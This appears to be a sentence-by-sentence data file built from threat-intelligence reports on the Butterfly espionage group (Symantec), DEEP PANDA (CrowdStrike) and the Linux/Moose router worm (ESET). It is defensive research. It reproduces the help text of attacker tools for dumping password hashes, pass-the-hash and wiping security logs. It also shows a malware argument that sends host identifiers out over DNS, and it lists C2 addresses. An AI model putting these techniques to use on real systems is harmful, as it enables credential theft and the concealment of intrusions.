, training documents , product descriptions , and financial records .", "1201": "In one technology company breach , Butterfly compromised a more unusual system .", "1202": "The attackers gained access to what is known as a Physical Security Information Management ( PSIM ) system .", "1203": "This software is used for aggregating , managing , and monitoring physical security systems and devices .", "1204": "The physical security systems could consist of CCTV , swipe card access , HVAC , and other building security .", "1205": "After compromised that system , the attackers could have monitored employees through the company 's own CCTV systems and tracked the activities of individuals within the building .", "1206": "Butterfly operates consistently across its breaches , deploying the same set of tools and targeting the same types of computers , which we detail in the Victims section of this report .", "1207": "Butterfly adapts quickly to targeted environments and takes advantage of systems already in place , such as remote access tools or management systems , in order to spread across the network .", "1208": "While Butterfly has used one confirmed zero - day exploit ( CVE-2013 - 0422 ) , the group appears to have used at least one more zero - day exploit against a vulnerability in Internet Explorer 10 .", "1209": "Gaining initial access The attack vector for Butterfly 's campaigns in late 2012 and early 2013 was well documented .", "1210": "The group conducted a watering - hole attack that compromised a popular mobile phone developer website , iPhoneDevSDK .", "1211": "com , to deliver a Java zero - day exploit .", "1212": "However , little information is known about how the Butterfly attackers have continued to gain access to victims ' systems , except for a few cases .", "1213": "In one of the most serious cases , on June 25 , 2014 , Internet Explorer 10 created a file called bda9.tmp on a victim 's computer .", "1214": "It is likely that bda9.tmp was created as a result of an exploit targeting Internet Explorer .", "1215": "The affected version of Internet Explorer was a fully up - to - date , patched version of the browser , so the exploit was very likely either a zero - day for Internet Explorer 10 or for a plugin used in Internet Explorer .", "1216": "Microsoft patched a number of Internet Explorer 10 remote code execution vulnerabilities in subsequent Patch Tuesday releases .", "1217": "It is possible that one of these patches covered the exploit , as there is no additional evidence of an Internet Explorer 10 exploit in use .", "1218": "It was not possible to identify the website hosting the exploit or to retrieve a copy of the exploit .", "1219": "In late 2014 , Java was used to create a file called updt.dat on a system belonging to another targeted organization .", "1220": "The updt.dat file was located in a JBossweb folder , which is a sub - folder of Apache Tomcat .", "1221": "Based on this activity , it seems likely that the JBoss server was compromised to deploy the malware .", "1222": "The breach may have been a result of an SQL injection attack .", "1223": "This is based on evidence from an analyzed C&C server , where we discovered that the Butterfly attackers use the SQLMap tool against their targets .", "1224": "Once Butterfly gains a foothold in the victim 's network , they begin to carefully spread through it , until they locate a system of interest .", "1225": "This application can be used to install applications or manage a user 's profile for authentication .", "1226": "It 's likely that the attackers took advantage of this system and placed the back door in a specific profile , which was triggered when the profile 's owner logged in .", "1227": "It appears that TeamViewer was legitimately present on the targeted computers and was then taken advantage of by the attackers .", "1228": "However the attackers spread within a network , they are able to move quickly .", "1229": "In one breach , the attackers first compromised a computer on April 16 , 2014 .", "1230": "Within one day , they compromised three more computers .", "1231": "Once a computer is infected , the attackers seem to rapidly determine whether or not the computer is valuable to them .", "1232": "There are two instances where there was no additional Butterfly activity after the computers were infected , apart from the creation of shred.exe .", "1233": "The Butterfly toolkit The Butterfly attackers use a number of different tools , a subset of which has been retrieved from compromised computers .", "1234": "This set of tools appears to be unique to the attackers , as the tools have been in use in combination with each other and there has been no open source data on the various tools used .", "1235": "The attackers use the hacking tools once they gain a foothold on a network .", "1236": "They generally give the tools .dat extensions and file names that usually give some indication of the tools ' purposes .", "1237": "For example , the attackers refer to one of the tools as \" Banner Jack \" and deploy it with the name bj.dat .", "1238": "It is likely that these files are encrypted when they are downloaded and are then decrypted when on disk .", "1239": "Known hashes and corresponding file names are listed in the appendix under the Hashes section .", "1240": "A number of the hacking tools also contain help documentation , which details how to use the tool .", "1241": "Each help description is listed in the appendix , where present .", "1242": "OSX.Pintsized and Hacktool . Securetunnel The back door OSX.Pintsized was well documented by F - Secure , Intego , and Romang after the 2012/2013 tech company attacks .", "1243": "OSX.Pintsized is a modification of OpenSSH that runs on Mac OS X , and contains additional code to read two new arguments and an embedded RSA key .", "1244": "The two additional arguments are \" -z \" and \" -p \" , which are used to pass a C&C server address and port respectively .", "1245": "The back door has also been observed using a very basic Perl script that opens a reverse shell .", "1246": "The Butterfly attackers use the same modified version of OpenSSH on 32-bit Windows systems .", "1247": "This version uses the exact same \" -z \" and \" -p \" additional arguments and also includes an embedded RSA key .", "1248": "The attackers have two versions : one which is statically linked against OpenSSH and the other which is compiled using a Cygwin DLL .", "1249": "Symantec detects these samples as Hacktool . Securetunnel .", "1250": "Backdoor . Jiripbot Romang referenced a malware family called Backdoor . Jiripbot ( aka Jripbot ) in his blog .", "1251": "This is the Butterfly group 's primary back door tool , which has a fallback domain generation algorithm ( DGA ) for maintaining command and control .", "1252": "A comprehensive technical description of this malware family is provided in the appendix .", "1253": "One notable point about Backdoor . Jiripbot is the use of the string \" AYBABTU \" as an encryption key .", "1254": "This is the acronym for \" All your base are belong to us \" , a popular meme used by gamers .", "1255": "The attackers have used several variants of this malware family from 2013 to at least June of 2015 , with several minor modifications adding or removing commands .", "1256": "Hacktool . Bannerjack Hacktool . Bannerjack is used to retrieve default messages issued by Telnet , HTTP , and generic Transmission Control Protocol ( TCP ) servers .", "1257": "The help documentation for the tool is listed in the appendix .", "1258": "The tool takes an IP address range and port .", "1259": "It then connects to each IP address on a given port , retrieving and logging any data printed by the server .", "1260": "The tool is presumably used to locate any potentially vulnerable servers on the local network , likely including printers , routers , HTTP servers , and any other generic TCP servers .", "1261": "Hacktool . Multipurpose Hacktool . Multipurpose also appears to be a custom - developed tool .", "1262": "It is designed to assist attackers in spreading through a network .", "1263": "The help documentation for this tool is quite comprehensive and extensively explains the tool 's functionality .", "1264": "This documentation is listed in the appendix .", "1265": "The help documentation for the tool is listed in the appendix .", "1266": "The documentation for the tool is listed in the appendix .", "1267": "Operational security The Butterfly attackers have demonstrated excellent operational security , as we have observed in several aspects of their attacks .", "1268": "The Butterfly attackers use a number of anti - forensics techniques to prevent detection and presumably hinder investigation into their activity when discovered .", "1269": "The group 's malware and other files are securely deleted using either the GNU Shred tool , which overwrites a file 's contents as well as deleting the index from the file allocation table , or the shred functionality written into a custom tool .", "1270": "A specific tool , Hacktool . Eventlog , appears to have been developed to perform just this function .", "1271": "Another aspect of Butterfly 's operational security is the use of throwaway registrant names for C&C domains .", "1272": "There appears to be no re - use of email addresses or names when registering different domains and C&C servers .", "1273": "Similarly , the Butterfly attackers use bitcoins to pay hosting providers to host their C&C servers .", "1274": "This method of payment makes it difficult for investigators to track the transaction back to a particular entity .", "1275": "Finally , one of the most telling aspects of the Butterfly attackers ' level of operational security is how they run their C&C servers .", "1276": "Symantec performed a forensic analysis of a C&C server used by the Butterfly attackers in late 2014 .", "1277": "These attackers typically use a multi - staged C&C infrastructure , with several servers acting as proxies and redirecting connections back to a final server .", "1278": "Symantec believes that the analyzed server was this final server , however , it was not possible to confirm this .", "1279": "The analyzed server was running Debian Linux and was very clean , with little traces of activity .", "1280": "Logging had been disabled and any log files that had been created before logging was disabled were securely deleted .", "1281": "A single file was present in the /root/ directory .", "1282": "This file , called \" hd - porn - corrupted_tofix.rar \" , was 400 GB in size .", "1283": "Despite the .rar extension , it was not a .rar file .", "1284": "However , there were some indications on the server as to what this file actually was .", "1285": "Truecrypt was installed on the server , as was Virtual Box .", "1286": "Truecrypt is an encryption tool that can be used to create an encrypted file system in a single file .", "1287": "Virtual Box is software that can be used to run a virtual machine .", "1288": "It is likely that the 400 GB \" .rar \" file was an encrypted Truecrypt file which contains a Virtual Box virtual machine .", "1289": "The Butterfly attackers would decrypt and run the virtual machine , redirecting SSH traffic from the physical hosting server to the virtual machine .", "1290": "This would give the attackers the ability to control compromised systems from within the virtual machine .", "1291": "This type of design is effective at hindering analysis without a live memory image of the C&C server .", "1292": "There were other hints of activity on the C&C server as well .", "1293": "There was evidence to suggest that the attackers used the SQLMap tool .", "1294": "This tool looks for SQL weaknesses in web applications , and indeed , as previously mentioned , at least one victim was compromised through a JBoss server , possibly through an SQL injection attack .", "1295": "Also , the local time zone of the C&C server was changed to New York , UTC-5 .", "1296": "However , apart from the SQLMap activity and the modified time zone , there was no other evidence on the C&C server .", "1297": "The Butterfly attackers maintained a very clean house .", "1298": "Based on the gathered evidence , there are several plausible theories that describe the nature of the Butterfly attackers .", "1299": "A summary of some of the data gathered is presented below .", "1300": "The nature of the observed victims indicates that it 's likely that Butterfly attackers ' motivation is not for national security intelligence , but rather for financial purposes .", "1301": "While there is one government victim , this likely appears to be collateral damage .", "1302": "As the hack tools include detailed documentation , it 's likely that there is more than one person performing the attacks , as a single attacker would not need to document their own tools .", "1303": "Based on the few concurrent infections , Butterfly may be made up of a small number of attackers , perhaps between three and ten people .", "1304": "It is also easier to maintain good operational security with a small number of people .", "1305": "The attackers are well resourced , given that they have access to at least one zero - day ( the Java exploit ) , and possibly more ( potential Internet Explorer 10 zero - day exploit ) .", "1306": "Their access to zero - day exploits implies that they either have the funding to purchase a zero - day or the technical skills to identify and exploit undiscovered vulnerabilities .", "1307": "If the Butterfly group is small , then it would make more sense to utilize people with a general skill set , rather than individuals who specialize in exploit discovery .", "1308": "This implies that the purchase of zero - day exploits is more likely .", "1309": "Along with this , if Butterfly is a professional group of hackers who work against deadlines and has internal goals , that would imply the need to be able to access zero - day exploits on demand .", "1310": "That would mean purchasing them , rather than waiting for a team member to discover one .", "1311": "At least some of the Butterfly attackers appear to be native English speakers , based on the help documentation in the hack tools and the use of memes and colloquialisms .", "1312": "It is possible that these English speakers are based in the US , judging from the time zone set on the C&C server .", "1313": "However , this seems like a very basic mistake for the attackers to make , considering how they have demonstrated great attention to detail in most aspects of their operations .", "1314": "Some attribution theories that may fit the evidence and conclusions are as follows .", "1315": "A government agency is the least likely of these theories , given the number of victims that span across various geopolitical boundaries and the lack of targeting of any victims that are related to traditional intelligence - gathering .", "1316": "It is far more likely that the Butterfly attackers are an organization of individuals working closely together to either steal intellectual property for another client or for their own financial gain , for example through the stock market .", "1317": "Organizations need to be aware of the threat that corporate espionage groups like Butterfly can pose .", "1318": "Butterfly is a skilled , persistent , and effective attack group which has been active since at least March 2012 .", "1319": "They are well resourced , using at least one or possibly two zero - day exploits .", "1320": "Their motivation is very likely to be financial gain and given that they have been active for at least three years , they must be successful at monetizing their operation .", "1321": "Based on our analysis , the Butterfly attackers are likely a small team that steals data either as a service to another client or to monetize it themselves through insider trading .", "1322": "Symantec believes that some members of Butterfly are native English speakers , given some of the colloquialisms and Western meme references included in their infrastructure .", "1323": "The Butterfly attackers represent a threat to organizations involved in technology , pharmaceutical , law , investment , energy and natural resources .", "1324": "However , over the past three years , the attackers have demonstrated that they can change their targets quickly , as they moved to include commodities in their list of targets in 2014 .", "1325": "Clearly , the Butterfly attackers will go where the money is .", "1326": "Organizations need to be aware of the threat that corporate espionage groups like Butterfly can pose .", "1327": "The attack group or their potential clients may have strong knowledge on how to leverage the stolen data to unfairly make gains in the market .", "1328": "Symantec customers are protected against the Butterfly attacker toolset with the following signatures .", "1329": "Additionally , YARA signatures and other indicators of compromise ( IoCs ) are listed in the appendix .", "1330": "Antivirus IPS Technical description of Backdoor . Jiripbot There are several different versions of Backdoor .", "1331": "Jiripbot , with the attackers adding or removing functionality over time .", "1332": "Details of one version is presented in this document , with the majority of functionality remaining unchanged across different versions .", "1333": "Functionality If the samples are executed with no command line argument and expected registry entries are missing , an infinite loop is entered that calculates SHA-1 hashes on random data .", "1334": "This is likely an attempt to avoid automation engines .", "1335": "To perform any activity , the samples need to be executed with a command line argument that begins with ' http ' .", "1336": "This value is encrypted and stored in the registry ; the registry location varies based on the sample .", "1337": "Each sample first encrypts the URL using RC4 with a hard - coded key .", "1338": "It should be noted that the hard - coded key is stored in the binary as a wide character string , but is converted to a multibyte character string before the key is used .", "1339": "This conversion will vary based on the region of the system executing the code .", "1340": "The malware takes exactly one command line argument , but the single command line argument has a structure that is manually parsed by the malware .", "1341": "The structure of the command line argument is as follows : \" http://[DOMAIN NAME].com /opts opt = val , opt = val ... \" Where \" opt \" is one of the following .", "1342": "Once the URL from the command line is RC4-encrypted , it is encrypted a second time using the crypt32!CryptProtectData API , with \" OptionalEntropy \" set to the ASCII string ' AYBABTU ' ( this is the acronym for the phrase \" All your base are belong to us \" ) .", "1343": "The use of crypt32!CryptProtectData ensures that if the encrypted data is retrieved from an infected computer , it is very hard to decrypt the data on another computer .", "1344": "The documentation for crypt32!CryptProtectData states .", "1345": "\" Typically , only a user with the same logon credential as the user who encrypted the data can decrypt the data . \" Next the malware examines its execution environment .", "1346": "It first checks to make sure that the file name it is currently running under is the same as the original name when the executable was created .", "1347": "The process names it searches for are hashed , so we are not clear what it is looking for .", "1348": "It checks the hashed values of the registry keys in HKEY_LOCAL_MACHINE\\SOFTWARE against a list of hashes .", "1349": "It also checks the registry subkeysHKEY _ LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum and HKEY_LOCAL_MACHINE\\HARDWARE\\ DESCRIPTION\\System\\BIOS\\SystemProductName ' resolv ' command When the resolv command line argument is set to a domain name , a domain name system ( DNS ) resolution request is made for that domain name with the current computer name and calculated UID value prepended to it .", "1350": "For example , we observed the following : resolv = h30026.drfx.chickenkiller.com When the sample is run with resolv set to that value , the following DNS query was observed : thread-2d9f4de5.1401420000c29bfea70f49b94b825e3e7586ce61350.h30026.drfx .", "1351": "chickenkiller.com In this query , \" thread-2d9f4de5 \" is the computer name and \" 1401420000c29bfea70f49b94b825e3e7586ce61350 \" is the calculated UID value .", "1352": "It is possible that the attackers use this method to exfiltrate the UID value , as the value is used in the DGA algorithm .", "1353": "UID / UPDATE_ID calculation The UID is a unique ID calculated by the malware , as the following example shows : 1401420000c29bfea70f49b94b825e3e7586ce61350 This ID consists of the following elements .", "1354": "Installation The following registry subkeys may be used by Butterfly to maintain persistence .", "1355": "The registry data stored in the \" Preferences \" and \" Options \" subkeys are REG_BINARY keys and the data within is encrypted using RC4 and crypt32!CryptProtectData , as described previously .", "1356": "The registry data stored in the UID is not encrypted ; it is stored in plain text .", "1357": "The value of \" Preferences \" is the encrypted version of the first command line argument used to first start the malware .", "1358": "For example , if the malware is launched as : FlashUtil.exe \" http://[DOMAIN NAME].com /opts vm=2 \" The value of \" Preferences \" will be : \" http://[DOMAIN NAME].com /opts vm=2 . \" The value of \" Options \" is the URL from the command line argument , so for the previous example , the value would be : \" http://[DOMAIN NAME].com \" Networking DGA Algorithm The DGA computes a URL similar to the following .", "1359": "Decryption keys The following MD5s used the corresponding keys for decryption .", "1360": "There is a string in all of the binaries equal to \" la revedere \" , which is \" goodbye \" in Romanian .", "1361": "Hacktool help descriptions Hacktool . BannerJack The following information details the help output of Hacktool . BannerJack : Usage : ./banner - jack [ options ] -f : file.csv -s : ip start -e : ip end -p : port -t : thread numbers ( optional , default 4 ) -v : verbose ( optional ) -d : daemonize ( optional - not supported on win32 ) -T : timeout connect ( optional , default % d secs ) -R : timeout read ( optional , default % d secs ) Hacktool . MultiPurpose The following information is the help output of Hacktool . MultiPurpose : Version : 1.5 General options --------------- --install : install server on local host and load it --host < host > : hostname or IP ( local host if not set ) --password < password > : server password connection ( mandatory ) --forceload : load server on local host without test Server options -------------- --cmd : server command : dump : dump stuffz --sam : fetch LM / NTLM hashes --machines : fetch machines hashes --history : fetch history for LM / NTLM hashes --sh : fetch logon sessions hashes --sp : fetch security packages cleartext passwords --accounts : < account list > : with --sam , specify accounts to dump ( comma separated ) --lsa : fetch LSA secrets --vnc : fetch VNC server password pth < PID : USER : DOMAIN : NTLM > : change credentials of PID startlog : start recording of loggon sessions stoplog : stop recording of loggon sessions getlog : retrieve stored loggon sessions callback < IP : port > : create a callback to IP : host ping : ping server shred < file > : shred a file remove : cancel null session , clean logs , wipe library quit : unload library reboot : reboot windows info : show info ( version , library path , etc . ) listevt : list events logs showevt < file>[:num ] : show < num > last entries in < file > events log ( default num : 15 ) last [ num ] : show last < num > login / logoff ( default num : all ) cleanlast - user < user > : remove user from security logs cleanlast - desc < word > : remove word from security logs ( in description ) cleanlast - quit < 1|0 > : enable / disable cleaning ANONYMOUS LOGON entries before quit Output options -------------- --file < filename > : output filename to dump information in --compress : compress data ( only used when file is set ) --encrypt < key > : encrypt data ( only used when file is set ) Misc options ------------ --print < key > : print a compress and/or encrypted specified file --test445 : test if port 445 is available on specified host --establishnullsession , --ens : establish a null session on specified host --cancelnullsession , --cns : cancel an established null session with a specified host Hacktool . Proxy . A The following information details the help output of Hacktool . Proxy . A : -z ip / host : destination ip or host -P port : destination port -x ip / host : proxy ip or host -Y port : proxy port -C cmdline : commandline to exec -u user : proxy username -p pass : proxy password -n : NTLM auth -v : displays program version -m : bypass mutex check --pleh : displays help Hacktool . Eventlog The following information details the help output of Hacktool . Eventlog : -z Zap ( kill ) all processes with specified name -y Dump logon / logoff events from Security channel ( -t and -n optionals ) -X Secure self delete our program -x Secure delete a file -w Show all logs from a .evtx file ( requires -f ) -v Enable verbose mode -t Delta time ( in hours -s Dump logon / logoff events from System channel ( -t and -n optionals ) -r RecordIds list , comma separated without spaces ( \" 1234,5678 \" ) -q Query Mode -p Filter with provider -n Number of events to show ( default 16 , 0=all ) -ll List all channels -l List used channels -K Match a keyword in XML data ( case insensitive ) from all channels -k Match a keyword in XML data ( case insensitive ) from a specific channel -h Help -f Specify a .evtx file ( system.evtx ) -F Flush all logs to disk -e EventIds list , comma separated without spaces ( \" 1234,5678 \" ) -Dr Dump all logs from a channel or .evtx file ( raw parser ) ( -c or -f ) -D Dump all logs from a channel .evtx file ( requires -c or -f ) -d Delete mode ( requires -e or -r ) -c Specify a channel ( ' Security ' , ' System ' , ' Application ' , ... ) YARA signatures The following details are the YARA signatures related to this analysis .", "1362": "File hashes Many of the hashes listed in Table 2 are for clean files which are used by the Butterfly attackers .", "1363": "Do not use any marked with \" N / A \" or \" Clean \" files in any automated detection system .", "1364": "They are provided merely as potential indicators of compromise , not as definitively malicious files .", "1365": "Any files that are marked as \" N / A \" were not retrievable by Symantec , but are believed to be used by the attackers .", "1366": "C&C server details The following IP addresses were used for C&C traffic using SSH over port 443 .", "1367": "The following C&C servers were used by Backdoor . Jiripbot and OSX.Pintsized .", "1368": "The following C&C domains were used by Butterfly - related back doors .", "1369": "They were also used to host exploits over HTTP .", "1370": "The following shows the format of Backdoor . Jiripbot 's DGA domains .", "1371": "About Symantec Symantec Corporation ( NASDAQ : SYMC ) is an information protection expert that helps people , businesses and governments seeking the freedom to unlock the opportunities technology brings -- anytime , anywhere .", "1372": "Founded in April 1982 , Symantec , a Fortune 500 company , operating one of the largest global data - intelligence networks , has provided leading security , backup and availability solutions for where vital information is stored , accessed and shared .", "1373": "The company 's more than 19,000 employees reside in more than 50 countries .", "1374": "Ninety - nine percent of Fortune 500 companies are Symantec customers .", "1375": "In fiscal 2015 , it recorded revenues of $ 6.5 billion .", "1376": "To learn more go to www.symantec.com or connect with Symantec at : go.symantec.com / social/.", "1377": "For specific country offices and contact numbers , please visit our website .", "1378": "Symantec World Headquarters Copyright 2015 Symantec Corporation .", "1379": "All 350 Ellis St.", "1380": "rights reserved .", "1381": "Symantec , the Symantec Logo , and the Checkmark Logo are trademarks or Mountain View , CA 94043 USA registered trademarks of Symantec Corporation + 1 ( 650 ) 527 - 8000 or its affiliates in the U.S.", "1382": "and other countries .", "1383": "1 ( 800 ) 721 - 3934 Other names may be trademarks of their www.symantec.com respective owners .", "1384": "Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation .", "1385": "NO WARRANTY .", "1386": "The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use .", "1387": "Any use of the technical documentation or the information contained herein is at the risk of the user .", "1388": "Documentation may include technical or other inaccuracies or typographical errors .", "1389": "Symantec reserves the right to make changes without prior notice .", "1390": "Over the last few months , the CrowdStrike Intelligence team has been tracking a campaign of highly targeted events focused on entities in the U.S.", "1391": "Defense Industrial Base ( DIB ) , healthcare , government , and technology sectors .", "1392": "Investigation into this activity led to associations with the adversary known to CrowdStrike as DEEP PANDA .", "1393": "On 31 July 2014 , an executable was identified , which , at the time , was not detected by any anti - virus products .", "1394": "The site 's domain name was meant to spoof that of a site set up to provide information on an alumni event for a U.S university .", "1395": "This page requested that the visitor download an Adobe - related plugin in order to view the content .", "1396": "The downloaded plugin file included a variant of Sakula malware .", "1397": "This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co. , Ltd.", "1398": "Command - and - Control ( C2 ) communications in this incident went directly to IP address 180.210.206.246 ; a sample GET request is below .", "1399": "Further investigation revealed similar activity stretching back to at least April 2014 , when similar TTPs were used to target a healthcare organization and a U.S .- based IT company with high - profile clients in the defense sector .", "1400": "Two other incidents were also identified in August 2014 targeting a company in the DIB and a Mongolian government entity .", "1401": "They display progress bars that make it appear as if the specified software is being updated or installed .", "1402": "The campaign appeared to be over by the end of August , but a file was recently discovered that suggests it may be ongoing .", "1403": "The intended target again appeared to be a Mongolian government entity , and the file masqueraded as an installer for Microsoft ActiveX software .", "1404": "The malware used the domain www[.]xha- mster[.]com for C2 which was created in mid - September and is registered with the email address wendellom@yahoo.com and registrant name \" tonyy starke \" ( hence the name , Ironman - related title for this blog ) .", "1405": "Below is a chart showing the relevant relationships to this DEEP PANDA campaign .", "1406": "The bottom of the chart shows an infrastructure connection between an IP address ( 198.200.45.112 ) used this campaign and also used in recently observed DEEP PANDA activity .", "1407": "In September 2014 , CrowdStrike Intelligence identified a malicious file signed with the DTOPTOOLZ Co. , Ltd.", "1408": "certificate .", "1409": "Analysis of this file revealed it to be Derusbi malware ( a favorite RAT of DEEP PANDA ) that used the domain vpn[.]foundationssl[.]com for its C2 .", "1410": "At the time of discovery , CrowdStrike did not attribute the file to DEEP PANDA based on the malware alone , but the use of the DTOPTOOLZ certificate to sign a malware variant known to be heavily used by this adversary makes it likely that this signed Derusbi sample is also attributable to DEEP PANDA .", "1411": "In a recent public report from PWC , another foundationssl[.]com domain was linked to activity involving the Strategic Web Compromise ( SWC ) framework more commonly known as Scanbox .", "1412": "In that operation , the Scanbox code was placed on the website of a U.S .- based think tank and utilized the malicious domain , news[.]foundationssl[.]com .", "1413": "The use of the two foundationssl[.]com subdomains suggests that the same adversary ( in this case DEEP PANDA ) was responsible for the signed Derusbi malware file and the think tank SWC activity .", "1414": "Furthermore , CrowdStrike publicly reported on DEEP PANDA targeting of think tanks in July 2014 .", "1415": "If you want to hear more about DEEP PANDA and their tradecraft or any of the other adversaries that CrowdStrike tracks , please contact : sales@crowdstrike.com [ 1 ] In February 2014 , CrowdStrike publicly reported on a campaign that leveraged Sakula malware ( http://www.crowdstrike.com / blog / french - connection - french - aerospace - focused - cve-2014 - 0322-attack- shares - similarities-2012/index.html ) ; however , the Tactics , Techniques , and Procedures ( TTPs ) between that campaign and this recent one are different , suggesting two distinct adversaries are using the Sakula malware .", "1416": "Share this -", "1417": "The Analysis of a Linux Router - based Worm Hungry for Social Networks Olivier Bilodeau & Thomas Dupuy May 2015 Linux / Moose is a malware family that primarily targets Linux - based consumer routers but that can infect other Linux - based embedded systems in its path .", "1418": "Linux / Moose is a standard statically - linked ELF binary that was stripped of any debugging symbols .", "1419": "It relies heavily on multithreading for its operation using as many as 36 threads .", "1420": "The threat displays out - of - the - ordinary network penetration capabilities compared to other router - based malware .", "1421": "ESET researchers ran and monitored a Moose - infected environment and collected operational information about the threat .", "1422": "This information includes which social networks were targeted and the unencrypted interactions between the operators , the infected host and the targeted social networks .", "1423": "Linux / Moose does not have a persistence mechanism and does not provide a generic backdoor shell access to the botnet operator .", "1424": "No vulnerability is exploited at any time during its operation ; it spreads by finding routers with weak credentials .", "1425": "This report contains an overview of the operation and an in - depth analysis of the threat , details of its network protocol , indicators of compromise ( IoC ) , cleaning instructions , prevention advice and the list of potentially targeted vendors .", "1426": "At ESET we like to investigate exotic threats .", "1427": "Whether they run on atypical architectures like MIPS or ARM , or they target embedded networked devices - like consumer routers or Internet of Things ( IoT ) devices - instead of desktops or phones or they are designed to obscure their end goal , these threats arouse our curiosity .", "1428": "There are other reasons , of course , for a threat to be considered exotic but , the threat under study here fits all the above categories .", "1429": "In fact , the only thing that 's not exotic about it is the name we 've given it : Linux / Moose1 .", "1430": "Well , at least for those of us at ESET Canada Research .", "1431": "This report is divided into two sections : a description of what we know about the operation , followed by a detailed technical description of the threat .", "1432": "Before going in too deep into the operation , though , we need to give you a high - level sense of what Moose can do .", "1433": "The high - level capabilities of this worm are .", "1434": "Interestingly , missing from this list is the persistence mechanism ( there is n't any ) and the fact that no generic backdoor shell access is made available to the botnet operator .", "1435": "Last but not least , this threat spreads only by compromising systems with weak or default credentials .", "1436": "No vulnerabilities are exploited by the malware .", "1437": "Although downplayed by system administrators , this attack vector has been effective at compromising a lot of Internet - connected systems .", "1438": "As FireEye recently stated : \" Brute forcing credentials remains one of the top 10 most common ways an organization is first breached . \" As we have found out , the malware 's main payload - its generic proxy service - is used solely to perform social network fraud .", "1439": "The story is similar for stolen traffic which targets browser cookies .", "1440": "With that understanding we summarize the threat graphically below .", "1441": "In that configuration two IP addresses will be referred to several times in this report : the IP address of the C&C server to use for reporting and infection , dubbed the report C&C server , and the IP address of the C&C server to use for relay ( NAT traversal ) , dubbed the relay C&C server .", "1442": "When looking at the broad possibilities of this malware it is not immediately obvious what its exact purpose is .", "1443": "It could go in many directions , from DDoS , to compromise of networks , and expose private servers to the operator ( via proxy ) , steal important yet unencrypted traffic , or perform man - in - the - middle attacks via DNS hijacking .", "1444": "It was not until we were able to decrypt our first configuration from the configuration C&C server that we were able to start to grasp what the operators were after .", "1445": "When we started running our own infected devices then the purpose became crystal clear .", "1446": "This threat is all about social network fraud .", "1447": "Additionally , by monitoring one infected router - which we firewalled in order to prevent it from infecting others - we were able to establish the nature of the traffic proxied through these routers .", "1448": "We collected this proxy data for almost a month in the spring of 2015 .", "1449": "What is highlighted here is that most of the traffic going through the proxy is encrypted .", "1450": "The operator traffic is carried via HTTP over a non - standard port ( TCP 2318 ) .", "1451": "It is used to communicate the external IP address of the infected device to the client at the other end of the proxy .", "1452": "It is worth noting that most of the HTTP traffic is for the Instagram social network and is upgraded to HTTPS right away using a Location : header .", "1453": "The SOCKS proxy overhead ( 1 ) and the redirection to use HTTPS instead of HTTP ( 2 ) can be seen in the capture .", "1454": "Although we ca n't see the content of the encrypted traffic , we can look at the destination IP address .", "1455": "Furthermore , we can inspect the certificate identifying the server and its Common Name ( CN ) - a mandatory attribute that allows to authenticate the website - giving us an accurate description of the destination of the proxied traffic .", "1456": "During our monitoring , the top 3 targets were Twitter , Instagram and Soundcloud .", "1457": "We regrouped the \" Others \" in a separate pie chart to make the graph readable .", "1458": "In addition to the encrypted data , we looked at the autonomous systems ( AS ) where the proxied traffic was going and cross - referenced it with passive DNS information .", "1459": "Using this method we were able to compile the list of targeted organizations below .", "1460": "We can also look at how much requests are made through the proxy and for what purpose was the proxy used .", "1461": "This is summarized in the below graph .", "1462": "Social networks is the number of proxy requests with a destination related to social networking sites as identified by the certifacate CN , passive DNS information or the IP address AS .", "1463": "botnet traffic is the number of proxy requests sent to C&C and was always related to the previously mentioned TCP port 2318 .", "1464": "Other is any proxy request that did n't fit the above categories .", "1465": "The graph highlights that infected hosts are leveraged only to access social networks and that , on average , more than 500 requests per day will go through an infected router .", "1466": "Unfortunately , since most of the traffic is encrypted , we can only speculate about what they are doing , even though we can make a shrewd guess .", "1467": "We will get to that eventually but first lets look at how big this threat is .", "1468": "Despite all our efforts we were unable to make a reliable estimate of the number of affected routers .", "1469": "This is due in part to the fact that the malware was built to make it hard to make an estimate .", "1470": "There is no peer - to - peer protocol , it uses a hardcoded IP address instead of DNS for C&C , and even though the backdoor is listening on the Internet on port 10073 to offer its proxy service , only IP addresses in a whitelist are allowed to connect .", "1471": "Another reason for our lack of success is the lack of security tools ecosystems ( like Anti - Virus ) on embedded systems .", "1472": "Finally , the hosting providers where the C&C are located were relunctant to cooperate , which did n't help .", "1473": "This section will list all other attempts we have made at estimating the population of this malware .", "1474": "Probes on the Internet Something we can use to give us a sense of the activity level of this threat is the general network activity on the Internet Storm Center 's probes regarding port 10073 .", "1475": "Since this port is unassigned by the IANA , and is not in use by any popular software , abnormally high volumes of traffic on that port could be an indicator of Moose activity .", "1476": "Port 10073 Activity Although we could n't find precise documentation , we believe that sources and targets represent whether the packet seen on the ISC 's probe going for port 10073 was from the source side or the target side of the probe .", "1477": "In themselves the numbers might paint an incomplete picture , since the probes are seeing just a subset of the Internet traffic - but if we compare them with HTTPS traffic over the same period , we see that Moose activity was roughly only an order of magnitude below HTTPS .", "1478": "We can also see a clear rise in 2014 that is too sharp to be statistically irrelevant .", "1479": "We first met Linux/ Moose in late July 2014 .", "1480": "Since the beginning of 2015 there seems to be a decline in activity but we know that the operators are still active since they keep updating their malware .", "1481": "The fact that they can remotely control the intensity of scanning activity on port 10073 might account for the apparent decline in traffic .", "1482": "Moose Aggressiveness Another measure of prevalence is the aggressiveness with which the bot spreads .", "1483": "We ran one infected host for 24 hours and measured its level of activity and its success rate at finding potential peers or connecting to exposed Telnet services .", "1484": "Here are our results .", "1485": "Over 24 hours , almost 170000 connection attempts were made on port 10073 , meant for 23000 unique hosts .", "1486": "Of those , 36 completed the TCP handshake , which means that they might be infected , or they have another service on this port2 , or they are firewalled weirdly3 .", "1487": "85000 Telnet connection attempts were made on 18000 unique hosts , of which 161 responded with a login banner .", "1488": "These numbers have to be taken with a grain of salt since they depend heavily on the type of hardware on which the malware runs .", "1489": "We ran it under software emulation - which is usually way slower than real hardware - in a virtualized Intel server - which is way more powerful than most routers .", "1490": "In other words , we do n't know how these numbers compare to real infected hardware but we tend to think that they should be comparable .", "1491": "Internet scan Finally , we asked our friends at Rapid7 to scan the Internet on both port 10073 and 23 ( Telnet ) in order to get a sense of how many Internet - facing devices listen to both ports .", "1492": "It turns out about 1 million IP addresses fit that description .", "1493": "If we remove the devices that had no Telnet banner , that number is reduced to around 50,000 potentially infected hosts .", "1494": 